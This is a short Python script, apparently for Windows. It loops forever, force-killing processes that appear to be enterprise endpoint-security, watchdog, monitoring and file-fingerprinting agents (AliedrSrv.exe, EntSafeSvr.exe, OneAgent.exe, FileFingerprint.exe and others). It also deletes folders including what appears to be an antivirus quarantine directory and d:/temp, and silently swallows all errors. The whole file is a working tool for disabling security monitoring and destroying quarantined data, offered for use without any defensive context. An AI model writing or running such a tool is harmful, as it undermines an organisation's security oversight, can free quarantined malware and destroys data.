#! /usr/bin/env python
# -*- coding:utf-8 -*-

"""
pip install psutil
"""

import time
import psutil
import sys
import shutil


def kill_process(name):
    pids = psutil.pids()
    try:
        for pid in pids:
            p = psutil.Process(pid)
            process_name = p.name()
            if name in process_name:
                print("Process name is: %s, pid is: %s" % (process_name, pid))
                try:
                    import subprocess
                    child = subprocess.Popen("cmd.exe /k taskkill /F /T /PID %i" % pid, shell=False)
                    time.sleep(3)
                    child.kill()

                except OSError:
                    if child:
                        child.kill()
                    print('Not found...')
    except:
        pass


def all_process():
    for process in psutil.process_iter():
        print('{:>5} {:>40} {:<50}'.format(process.pid, process.name(), process.create_time()))


if __name__ == '__main__':

    while (True):
        
        try:
            kill_process('AliedrSrv.exe')
        except:
            pass
        try:
            kill_process('EntSafeSvr.exe')
        except:
            pass
        try:
            kill_process('bfe_watch_dog.exe')
        except:
            pass
        try:
            kill_process('OneAgent.exe')
        except:
            pass
        try:
            kill_process('AliSystemSrv.exe')
        except:
            pass
        try:
            kill_process('FileFingerprint.exe')
        except:
            pass
        try:
            shutil.rmtree("d:/!CloudShell")
        except:
            pass
        try:
            shutil.rmtree("c:/!CloudShell")
        except:
            pass
        try:
            shutil.rmtree("c:/AliAVQuarantine")
        except:
            pass
        try:
            shutil.rmtree("d:/temp")
        except:
            pass
        time.sleep(20)
    # sys.exit(0)


    
